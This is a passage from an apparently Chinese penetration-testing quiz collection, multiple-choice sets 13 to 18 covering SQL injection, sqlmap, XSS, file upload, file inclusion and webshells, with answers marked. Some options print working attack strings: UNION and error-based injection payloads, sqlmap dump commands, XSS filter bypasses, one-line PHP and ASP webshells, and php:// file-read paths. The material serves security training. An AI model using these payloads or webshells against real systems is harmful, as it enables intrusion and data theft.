）方式采用加密的数据传输。<br>A. rsh<br>B. telnet<br>C. <strong><code>ssh</code></strong><br>D. rlogin</li><li>下列工具中可以对Web表单进行暴力破解的是？（ ）<br>A. <code>Burp suite</code><br>B. Nmap<br>C. Sqlmap<br>D. Appscan</li><li>下列选项中不是Hydra 工具中的 -e 参数的值是（）<br>A. <code>o</code><br>B. n<br>C. s<br>D. r</li><li>aspx 的网站配置文件一般存放在哪个文件里（）<br>A. conn.asp<br>B. config.php<br>C.<code>web.config</code><br>D. index.aspx</li><li>在Google Hacking 中，下面哪一个是搜索指定文件类型的语句（）<br>A. intext<br>B. intitle<br>C. site<br>D. <code>filetype</code></li><li>通过修改HTTP headers 中的哪个键值可以伪造来源网址（）<br>A. X-Forwarded-For<br>B. User-Agent<br>C. Accept<br>D. <code>Referer</code></li><li>SQL 注入出password 的字段值为“YWRtaW44ODg&#x3D;”，这是采用了哪种加密方式（）<br>A. md5<br>B. <code>base64</code><br>C. AES<br>D. DES</li><li>下列哪项不属于通用<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>框架的内容（）<br>A. 信息收集<br>B. 社工<br>C. 访问维护<br>D．<code>需求分析</code></li></ol><p><strong>17.</strong> 下列在2017 年6 月1 日开始施行的法律是（）<br>A．<code>《网络安全法》</code><br>B．刑法修正案<br>C．《计算机信息系统安全保护条例》<br>D．《互联网上网服务营业场所管理条例》</p><p>**18. **下列哪个工具可以进行Web 程序指纹识别（）<br>A．nmap<br>B．OpenVAS<br>C. 御剑<br>D. <code>whatweb</code></p><p>**19. **远程windows 口令破解的工具是（）<br>A. <code>NtScan</code><br>B. getpass<br>C. Hydra<br>D. Saminside</p><p><strong>20.</strong> 下列哪个不属于密码破解的方式（）<br>A. 密码学分析<br>B. <code>撞库</code><br>C. 暴力破解<br>D. 字典破解</p><hr><h3 id="选择题-14"><a href="#选择题-14" class="headerlink" title="选择题 14"></a>选择题 14</h3><ol><li>下列工具中可以直接从内存中读取windows 密码的是（）<br>A. <code>getpass</code><br>B. QuarkssPwDump<br>C. SAMINSIDE<br>D. John</li><li>下列不属于口令安全威胁的是（）<br>A. 弱口令<br>B. 明文传输<br>C. <code>MD5 加密</code><br>D. 多账户共用一个密码</li><li>下列哪个不是密码字典（）<br>A．弱口令字典<br>B. 社工字典<br>C. 彩虹表<br>D. <code>《康熙字典》</code></li><li>下列哪个工具不能用于信息搜集（）<br>A. <code>sqlmap</code><br>B. dig<br>C. dnsenum<br>D. nslookup</li><li>下列哪个不是搜索引擎（）<br>A. 撒旦<br>B. 钟馗之眼<br>C．<code>天眼查</code><br>D. bing</li><li>渗透测试的主要目标是（）<br>A．响应<br>B. 修补<br>C. <code>检测</code><br>D．威慑</li><li>下列哪种攻击方式是利用TCP 三次握手的弱点进行的（）<br>A．<code>SYN FLOOD</code><br>B. 嗅探<br>C. 会话劫持<br>D. SQL 注入</li></ol><p>**8.**在生成系统帐号时，系统管理员应该分配给合法用户一个____，用户在第一次登录时应更改口令。<br>A．<code>唯一的口令</code><br>B．登录的位置<br>C．使用的说明<br>D．系统的规则</p><p><strong>9．</strong> ____是企业信息安全的核心。</p><p>A． 安全教育<br>B． 安全措施<br>C．<code>安全管理</code><br>D． 安全设施</p><p><strong>10．</strong>《计算机信息系统安全保护条例》规定，任何组织或者个人违反条例的规定，给国家、集体或者他人财产造成损失的，应当依法承担____。</p><p>A． 刑事责任<br>B． <code>民事责任</code><br>C． 违约责任<br>D． 其他责任</p><p><strong>11．</strong>HTTPS使用端口是以下哪个？<br>A. 110<br>B. <code>443</code><br>C. 80<br>D. 8080</p><p>**12. **在渗透测试过程中，作为审计员所要遵循的道德规范，不正确的是（）<br>A. <code>审计人员可以在和客户达成正式协议之前对目标系统进行渗透测试，来提高渗透测试的效率。</code><br>B. 在测试过程中，在没有得到客户明确许可的情况下，测试人员不 得进行超出测试范围越过已约定范畴的安全测试。<br>C. 测试人员应当遵守测试计划所明确的安全评估的时间期限<br>D.测试人员应当遵循在测试流程里约定的必要步骤。</p><p><strong>13.</strong> 下列关于网络安全的法律法规，是《刑法》的内容（）<br>A. 国家保护公民、法人和其他组织依法使用网络的权利，促进 网络接入普及，提升网络服务水平，为社会提供安全、便利的网络 服务，保障网络信息依法有序自由流动。<br>B. 任何个人和组织不得窃取或者以其他非法方式获取个人信息， 不得非法出售或者非法向他人提供个人信息。<br>C. 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从 事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助， 尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可 以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十 五日以下拘留，可以并处十万元以上一百万元以下罚款。<br>D. <code>违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</code><br><strong>14.</strong> 下列关于HTTP 协议，叙述错误的是（）<br>A.它于1990 年提出，当前版本为HTTP&#x2F;1.1<br>B.<code>HTTP 设计用来将服务器端脚本（PHP）从Web 服务器传送到Web 浏览器。</code><br>C.HTTP 是一个请求和响应的协议：客户机发送请求，服务器对请求给出回应。<br>D.HTTP 使用可靠的TCP 链接，可以使用端口8000。</p><p><strong>15.</strong> 下列哪个方法不是HTTP 协议的请求方法（）</p><p>A.HEAD<br>B.<code>SELECT</code><br>C.PUT<br>D.OPTIONS</p><p><strong>16.</strong> 下列哪一项不是同源策略的内容（）</p><p>A.协议<br>B.域名<br>C.<code>文件名</code><br>D.端口号</p><p><strong>17.</strong>  下列（）不属于渗透测试的分类<br>A.白盒测试<br>B.黑盒测试<br>C.灰盒测试<br>D.<code>骨灰盒测试</code></p><p><strong>18.</strong>  对网络系统进行渗透测试，通常是按什么顺序来进行的：( )<br>A. 控制阶段、侦查阶段、入侵阶段<br>B. 入侵阶段、侦查阶段、控制阶段<br>C. <code>侦查阶段、入侵阶段、控制阶段</code><br>D. 侦查阶段、控制阶段、入侵阶段</p><p>**19.**（）不属于网站渗透测试的内容。<br>A．<code>防火墙日志审查</code><br>B．防火墙远程探测与攻击<br>C．跨站攻击<br>D．SQL注入</p><p><strong>20.</strong> 下列哪一个安全公告来自于微软（）<br>A. CWE-22<br>B. CVE-2018-3191<br>C. <code>MS17-010</code><br>D. S2-057</p><hr><h3 id="选择题-15"><a href="#选择题-15" class="headerlink" title="选择题 15"></a>选择题 15</h3><ol><li>下列（）是SQLi辅助工具<br>A. <code>sqlmap</code><br>B. dig<br>C. dnsenum<br>D. nslookup</li><li>若已检测出当前界面所对应的数据库中有user表，且在使用order by 3测试时网页正常显示，之后测试网页报错，现在要对user表进行联合查询，则以下的联合查询正确的是（）<br>A. ?id&#x3D;44 union select 1,2,3,4 from shop<br>B. ?id&#x3D;44 union insert 1,2,3,4 from user<br>C. ?id&#x3D;44 union select 1,2,3 from shop<br>D. <code>?id=44 union select 1,2,3 from user</code></li><li>SQLmap中–columns命令实现的效果是（）<br>A. 列出所有数据库名字<br>B. <code>列出所有字段名字</code><br>C. 列出所有表的名字<br>D. 列出指定数据库指定表中的所有字段的名字</li><li>sqlmap确定以下这条命令前，至少需要执行几查询操作：sqlmap –url “<a href="http://10.10.10.136/sqli-labs/Less-1/?id=1%E2%80%9D">http://10.10.10.136/sqli-labs/Less-1/?id=1”</a> -D “security” -T “users” -C username,password –dump （）<br>A. <code>3</code><br>B. 4<br>C. 5<br>D. 6</li><li>SQL注入攻击可通过何种方式进行防护（）<br>A. 购买硬件防火墙，并只开放特定端口<br>B. 安装最新的系统补丁<br>C. 将密码设置为12位的特别复杂密码<br>D. <code>使用web应用防火墙进行防护。</code></li><li>要获取数据库中后台管理员账密，正确的顺序是（）<br>A. <code>数据库名、表名、字段名、字段内容</code><br>B. 数据库版本、当前数据库物理路径、文件名、字段内容<br>C. 数据库名、字段名、表名、字段内容<br>D. 数据库版本、数据编码、表名、当前数据库名</li><li>SQLi 两大基本类别是（）<br>A. 有回显注入、盲注<br>B. 盲注、数字型注入<br>C. <code>字符型、数字型</code><br>D. 报错注入、延时注入</li><li>SQL注入不可以使用以下哪些方法测试（）。<br>A. 在参数后面加单引号，如果出现SQL异常信息，表示存在SQL注入<br>B. 在参数后面使用“ and 1&#x3D;1”和“ and 1&#x3D;2”测试数字型SQL注入<br>C. 在参数后面使用“ and 1+3&#x3D;2+2”和“ and 1+2&#x3D;1+1”测试数字型SQL注入<br>D. <code>在参数后面使用“ or 1=1”和“ or 2=2”测试数字型SQL注入</code></li><li>下列（ ）不是SQLi 报错注入公式<br>A. ?id&#x3D;1’ and extractvalue(1,concat(’^’,(select version()),’^’)) –+<br>B. ?id&#x3D;1’ and (select 1 from (select count(*),concat((select version() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+<br>C. ?id&#x3D;1’ and updatexml(1,concat(’^’,(select database()),’^’),1) –+<br>D. <code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></li><li>下列关于MYSQL 数据库的描述，错误的是（ ）<br>A. 字符串截取函数有substring()、substr()、mid()<br>B. concat_ws()是含有分割符的连接字符串<br>C. <code>information_schema 数据库默认情况下只有root 用户具有访问权限</code><br>D. 联合查询可以实现跨库跨表查询</li><li>SQLi 注入漏洞不会出现在（ ）位置<br>A. GET 参数<br>B. Cookie<br>C. Referer<br>D.<code>HTTP请求报文的HOST字段</code></li><li>使用SQLMAP 进行COOKIE 注入时，正确的语句是（ ）<br>A.<code>-u &quot;shownews.asp&quot; --cookie &quot;id=2&quot; --level2</code><br>B. -r post.txt<br>C. sqlmap -g “inurl:php?id&#x3D;”<br>D. -u “shownews.asp” -D ‘database’ -T ‘table’ -C ‘user,pwd’ –dump</li><li>下列哪个不属于XSS攻击类型（ ）。<br>A. 反射型XSS<br>B. 存储型XSS<br>C. DOM型XSS<br>D. <code>延时型XSS</code></li><li>已知一台服务器存在注入，源代码如下，下列选项中不可以绕过过滤并弹框的是（ ）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123; <br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] ); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; <br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">A. <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(/xss/)</span>&gt;</span> <br><br>B. `<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>`<br><br>C. &lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><br>D. <span class="hljs-tag">&lt;<span class="hljs-name">ScRipt</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>15.</strong> 下列关于XSS 漏洞危害叙述错误的是（ ）<br>A. 盗取各种用户账号<br>B. 窃取用户Cookie资料，冒充用户身份进入网站<br>C. 劫持用户会话，执行任意操作<br>D. <code>读写服务器端文件</code></p><p><strong>16.</strong> 下列不能验证XSS 漏洞存在的代码是（ ）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">A. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>B. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>C. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>D. `<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;http://domain.com/1.gif&#x27;</span>&gt;</span>`<br></code></pre></td></tr></table></figure><p><strong>17.</strong> 下列关于存储型XSS 叙述错误的是（ ）<br>A. 存储型XSS 是持久性跨站脚本。<br>B. 持久性体现在XSS 代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。<br>C. <code>存储型XSS 的危害比参数型XSS 小</code><br>D. 存储型XSS 通常发生在留言板等地方</p><p><strong>18.</strong> 关于XSS 的构造方法错误的是（ ）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">A. <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(/xss/)&quot;</span>&gt;</span><br><br>B`<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>`<br>C. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/emmmmm/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>D. <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">οnfοcus</span>=<span class="hljs-string">alert(/xss/)</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>19.</strong> 下列关于XSS 的变形错误的是（ ）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">A. <span class="hljs-tag">&lt;<span class="hljs-name">Img</span> <span class="hljs-attr">sRc</span>=<span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-attr">Onerror</span>=<span class="hljs-string">&quot;alert(/xss/)&quot;</span> /&gt;</span><br>B. &lt;Img/sRc=&#x27;#&#x27;/Onerror=&#x27;alert(/xss/)&#x27; /&gt;<br>C. <span class="hljs-tag">&lt;<span class="hljs-name">A</span> <span class="hljs-attr">hREf</span>=<span class="hljs-string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>D. `<span class="hljs-tag">&lt;<span class="hljs-name">Img</span> <span class="hljs-attr">sRc</span>=<span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-attr">Onerror</span>=<span class="hljs-string">&quot;alErt(/xss/)&quot;</span> /&gt;</span>`<br></code></pre></td></tr></table></figure><p>20.下列（ ）不是XSS Shellcode 的调用方式<br>A. 远程调用JS<br>B. <code>从受害者本地系统文件中调用</code><br>C. XSS Downloader<br>D. 从Cookie 中调用JS</p><hr><h3 id="选择题-16"><a href="#选择题-16" class="headerlink" title="选择题 16"></a>选择题 16</h3><ol><li>下列对跨站脚本攻击描述正确的是（ ）。<br>A. <code>XSS攻击是指恶意攻击者往web页面里面插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的代码会被执行，从而达到恶意攻击用户的特殊目的</code><br>B. XSS攻击是DDOS攻击的一种变种<br>C. XSS攻击就是CC攻击<br>D. XSS攻击就是利用被控制的机器不断地向被攻击网站发送访问请求，迫使<a href="https://so.csdn.net/so/search?q=IIS&spm=1001.2101.3001.7020">IIS</a>连接数超出限制，当CPU资源或者带宽资源耗尽，那么网站也就被攻击垮了，从而达到攻击目的</li><li>下列哪种行为容易遭受XSS 攻击（ ）<br>A. <code>打开网友留言中的连接</code><br>B. 对数据进行定期备份<br>C. 及时安装计算机系统的安全补丁<br>D. 安装正版杀毒软件并更新</li><li>下列（ ）说法是错误的<br>A. Web 漏洞发掘分为黑盒模式和白盒模式<br>B. DDOS 是分布式拒绝服务攻击<br>C. <code>XSS 漏洞主要影响服务器</code><br>D. 上传检查文件扩展名和检查文件类型是不同的安全检查机制</li></ol><p><strong>4.</strong> 下列（ ）说法是不正确的<br>A. SQLi 可以通过表单直接提交<br>B. 入侵检测与防火墙一样是被动式防御工具<br>C. 一个网络信息系统最重要的是计算机硬件<br>D. <code>将操作系统设置为在几次无效登录后锁定账号，是为了防止缓冲区溢出攻击</code></p><p><strong>5.</strong> 只备份上次备份以后有变化的数据，属于数据备份类型的（ ）<br>Ａ．完全备份  <br>Ｂ．<code>增量备份</code><br>Ｃ．拆分备份  <br>Ｄ．按需备份</p><p>**6.**下列对跨站脚本攻击的解释最准确的一项是：（ ）<br>A.引诱用户点击虚假网络链接的一种攻击方法<br>B.构造精妙的关系数据库的结构化查询语言对数据库进行非法的访问<br>C.一种很强大的木马攻击手段<br>D.<code>将恶意代码嵌入到用户浏览的web网页中，从而达到恶意的目的</code></p><p><strong>7.</strong> 为了防御XSS跨站脚本攻击，我们可以采用多种安全措施，但（ ）是不可取的。<br>A、编写安全的代码：对用户数据进行严格检查过滤<br>B、可能情况下避免提交HTML代码<br><code>C、阻止用户向Web页面提交数据</code><br>D、即使必须允许提交特定HTML标签时，也必须对该标签的各属性进行仔细检查，避免引入javascript</p><p><strong>8.</strong> 对某asp网站，我们采用经典的1&#x3D;1，1&#x3D;2测试法，测试发现1&#x3D;1时网页显示正常，1&#x3D;2时报错，则下列说法错误的是：（ ）<br>A.该网站可能存在漏洞<br>B.<code>该网站不可以进行SQL注入攻击</code><br>C.攻击者可以根据报错信息获得的信息，从而进一步实施攻击<br>D.如果在网站前布署一台H3C的IPS设备，那么1&#x3D;1，1&#x3D;2测试时，URL请求将会被IPS设备阻断，攻击者得不到任何有效信息。</p><p><strong>9.</strong> SQL 注入漏洞发生在（ ）<br>A. <code>应用层</code><br>B. 数据链路层<br>C. 传输层<br>D. 网络层</p><p><strong>10.</strong> 被誉为“瑞士军刀” 的工具是（ ）<br>A. nmap<br>B. SQLMAP<br>C.<code>netcat</code><br>D. Burp Suite</p><p>**11. **使用SQLmap 时，哪个命令可以获取所有数据库名（ ）<br>A. –tables<br>B. –current_db<br>C. <code>--dbs</code><br>D. –is-dba</p><p><strong>12.</strong> MSSQL 的默认端口是（ ）</p><p>A. 3389<br>B. 1521<br>C. 3306<br>D. <code>1433</code></p><p><strong>13.</strong> 利用以下哪个语句可以快速判断注入的列数?（ ）<br>A. select 1,2,3,4,5 from inforamation_schema<br>B. <code>order by 数字</code><br>C. 通过union select null，增加null的数量逐个去试<br>D. order by 列名</p><p><strong>14.</strong> 下列哪个漏洞不是由于未对输入做过滤造成的？（ ）<br>A. <code>DOS攻击</code><br>B. SQL注入<br>C. 日志注入<br>D. 命令行注入</p><p>**15. **攻击者提交请求<a href="http://www.domain.com/news.asp?id=772%E2%80%99%EF%BC%8C%E7%BD%91%E7%AB%99%E5%8F%8D%E9%A6%88%E4%BF%A1%E6%81%AF%E4%B8%BAMicrosoft">http://www.domain.com/news.asp?id=772’，网站反馈信息为Microsoft</a> OLE DB Provider for ODBC Drivers 错误’80040e14’，不能能够说明该网站（ ）<br>A. 数据库为Access<br>B.<code>该网站存在XSS 漏洞</code><br>C. 数据表中有个字段为id<br>D. 该网站存在SQL 注入漏洞</p><p><strong>16.</strong> 以下代码容易触发什么漏洞（ ）</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;欢迎您, &quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;!&lt;/p&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><p>A. <code>XSS 漏洞</code><br>B. SQLi<br>C. OS 命令注入<br>D. 代码注入</p><p><strong>17.</strong> 下列（ ）不是常见系统命令函数<br>A. system()<br>B. exec()<br>C. <code>assert()</code><br>D. shell_exec()</p><p><strong>18.</strong> 下列（ ）不是常见PHP 代码执行函数<br>A. eval()<br>B. assert()<br>C. call_user_func()<br>D. <code>var_dump()</code></p><p><strong>19.</strong> SHA加密法的字元范围为（）</p><p>A. [A-Z0-9]</p><p>B. <code>[A-F0-9]</code></p><p>C. [a-z0-9]</p><p>D. [a-f0-9]</p><p><strong>20.</strong> Apache单个进程中php匿名函数的名字为（）</p><p>A.  lambad_%d</p><p>B.  <code>\x00lambda_%d</code></p><p>C.  %lambad_%d</p><p>D.  0lambad_%d</p><h3 id="选择题-17"><a href="#选择题-17" class="headerlink" title="选择题 17"></a>选择题 17</h3><ol><li>以下（ ）方法制作的图片马不能成功。<br>A. 十六进制编辑器制作图片木马。<br>B. 控制台命令合并文件。<br>C. 文件头添加GIF89a。<br>D. <code>将木马复制到图片的最底部。</code></li><li>以下不是网站后台编辑器是（ ）<br>A. fckeditor<br>B. <code>eclipse</code><br>C. ewebeditor<br>D. ueditor</li><li>以下哪项会造成文件上传功能中出现安全问题？（ ）<br>A.<code>文件上传的目录设置为可执行</code><br>B. 用白名单机制判断文件类型<br>C. 对上传的文件做更改文件名、压缩、格式化等预处理<br>D. 单独设置文件服务器的域名</li><li>Ewebeditor默认数据库路径是（ ）<br>A. &#x2F;database&#x2F;mdb<br>B. <code>/db/ewebeditor.mdb</code><br>C. &#x2F;database&#x2F;ewebeditor.mdb<br>D. &#x2F;db&#x2F;mdb</li><li>下列不属于PHP中的文件包含语句的是（ ）<br>A. require_once<br>B. include_once<br>C. <code>allow_url_fopen</code><br>D. include</li><li>以下不会导致文件上传漏洞产生的是（ ）<br>A. 使用网站后台编辑器ewebeditor 2.8.0<br>B. 仅在前端用JS 脚本做了检测<br>C.<code>对上传的图片进行二次渲染</code><br>D. 文件解析漏洞导致文件执行</li><li>菜刀不能实现以下哪个功能 （ ）<br>A. 文件管理<br>B. 虚拟终端<br>C. 数据库管理<br>D. <code>页面管理</code></li><li>文件上传漏洞完美利用，不包括以下哪个条件 （ ）<br>A. Web 服务器要开启文件上传功能，并且上传api（接口）对外“开放”（Web 用户可以访问）<br>B. Web 用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，Web 目录都有执行权限。<br>C. 要想完美利用文件上传漏洞，就是上传的文件可以执行，也就是Web 容器可以解析我们上传的脚本，无论脚本以什么样的形式存在。<br>D.<code>服务器配置不当，关闭了PUT 方法。</code></li><li>文件上传漏洞的防御主要从以下几个方面考虑，在代码角度其中错误的一句是（ ）<br>A. 采用白名单策略，严格限制上传文件的后缀名。<br>B. 进行二次渲染，过滤掉图片马中的恶意代码。<br>C. 上传文件重命名，尽量少的从客户端获取信息。<br>D. <code>严格处理文件路径，防御00 截断漏洞，不避开空格、点 、::$DATA 等windows 特性</code></li><li>下列哪个选项不是小马的变形（ ）</li></ol><p>A. &lt;%eval request(“cmd”)%&gt;<br>B. <?php @eval($_REQUEST['cmd']);?><br>C. &lt;%@ Page Language&#x3D;”Jscript”%&gt;<br>   &lt;%eval(Request.Item[“cmd”],”unsafe”);%&gt;<br>D.<code> &lt;%=now()%&gt;</code></p><ol start="11"><li><p>不是本地文件包含利用（ ）<br>A. 上传图片GETshell<br>B. 读取文件，读取php文件<br>C. 包含日志文件获取webshell<br>D. <code>一句话木马</code></p></li><li><p>以下关于小马的说法错误的是（ ）<br>A：小马就是一句话木马<br>B：<code>小马代码量比较大</code><br>C：小马功能比较强大<br>D：小马是发哥演的</p></li><li><p>文件包含漏洞特点，错误的是（ ）<br>A. 无视文件扩展名读取文件<br>B. 以源码的方式读取文件<br>C. 如果被包含的文件中有php 代码，就回去尝试执行它<br>D. <code>在JSP、ASP、ASP.NET程序中存在较多</code></p></li><li><p>下列说法错误的是（ ）<br>A. include_once 表示如果文件已经包含则不会再加载<br>B. 白名单策略对于文件类型限制，比黑名单更严格<br>C. <code>通过require包含的文件出错不影响后续php语句的执行</code><br>D. 图片马里的php代码都不能执行</p></li><li><p>下列哪个属于web容器IIS6.0的解析漏洞（ ）<br>A. info.php.xxx.xx.x与info.php效果相同<br>B. 使用.htaccess攻击<br>C.<code>文件夹名解析错误 *.asp下的所有文件当做asp脚本执行</code><br>D. 00截断</p></li><li><p>下列（ ）不是PHP 封装协议的使用方法。<br>A. 读取本地系统件?path&#x3D;file:&#x2F;&#x2F;C:\Windows\System32\drivers\etc\hosts<br>B. 传输PHP 文件?path&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;include.php<br>C. <code>直接包含图片马/fileIncludesion/include.php?path=love.png</code><br>D. 执行PHP 命令?path&#x3D;php:&#x2F;&#x2F;input</p></li><li><p>下列文件扩展名和MIME类型对应错误的是（ ）<br>A. .js application&#x2F;x-javascript<br>B. .pdf application&#x2F;pdf<br>C. <code>.jpg image/jpg</code><br>D. .png image&#x2F;png</p></li><li><p>为防止文件上传漏洞，需要在服务器端做一些验证，下列说法错误的是（ ）。<br>A. 对文件类型进行检查<br>B. 对文件的长度和可接受的大小限制进行检查<br>C. 对文件类型要使用白名单过滤，不要使用黑名单<br>D. <code>对于一些特殊字符串（…/）一定要做好过滤，如果发现含有不合法的字符串，要及时进行异常处理，尝试纠正错误</code></p></li><li><p>以下说法错误的是（ ）<br>A．00截断是因为PHP 的文件系统操作函数是基于C 语言开发的。C 语言在处理字符串时遇到NULL 字符就会认为字符串已经结束。<br>B．.htaccess 是Apache 服务器的分布式配置文件，该配置文件会覆盖Apache 服务器的全局配置，作用域是当前目录及其子目录。<br>C．<code>在Apache中，一个名为[time.asp;1.jpg]的文件会被识别为asp脚本文件，并执行。</code><br>D．在IIS6.0 中，文件夹[*.asp] 下的所有文件都会被当作asp 脚本来执行。</p></li></ol><hr><h3 id="选择题-18"><a href="#选择题-18" class="headerlink" title="选择题 18"></a>选择题 18</h3><ol><li>下面哪种上传文件的格式是利用的Nginx解析漏洞（ ）<br>A &#x2F;test.asp;1.jpg<br>B <code>/test.jpg/1.php</code><br>C &#x2F;test.asp&#x2F;test.jpg<br>D &#x2F;test.php.xxx</li><li>以下哪一种不属于php封装协议（ ）<br>A. http:&#x2F;&#x2F;<br>B. zlib:&#x2F;&#x2F;<br>C. <code>ssh://</code><br>D. globp:&#x2F;&#x2F;</li><li>文件上传漏洞成因不包括（ ）<br>A. 服务器配置不当<br>B. <code>开放了文件上传功能,并进行了限制</code><br>C. 系统特性、验证或者过滤不严格<br>D. web用户对目标目录有可写权限甚至执行权限</li><li>下列哪些方法可以绕过服务器端对文件内容的检测（ ）<br>A. 使用Burp抓包，修改Content-Type 字段绕过检测<br>B. <code>通过制作上传图片木马绕过检测</code><br>C. 修改文件扩展名绕过<br>D. 00截断绕过</li><li>文件上传检测检测文件后缀名，采用白名单策略时，以下错误的是（ ）<br>A. 前端JS 脚本检测时，修改JS 代码，甚至删除表单事件。<br>B. 前端JS 脚本检测时，本地构造HTML 表单。<br>C. <code>服务器端检测检测时，使文件后缀名符合白名单策略，用Burp 挂代理抓包，然后修改文件后缀名即可。</code><br>D. 服务器端检测检测时，上传图片马绕过。</li><li>从服务器角度如何防御文件上传漏洞：（ ）<br>A. 上传文件重命名，尽量少的从客户端获取信息<br>B. 进行二次渲染，过滤掉图片马中的恶意代码<br>C. <code>及时更新Web 容器，防止解析漏洞的产生</code><br>D. 避免文件包含漏洞</li><li>以下不包括上传漏洞的危害的是（）<br>A. 上传任意文件<br>B. 网站沦陷<br>C. <code>服务器烧毁</code><br>D. 被攻击者控制</li><li>文件包含漏洞中读取敏感文件漏洞达成的条件不需要（）<br>A. 目标文件存在<br>B. web用户身份具有可读权限<br>C. 任意文件读取<br>D. 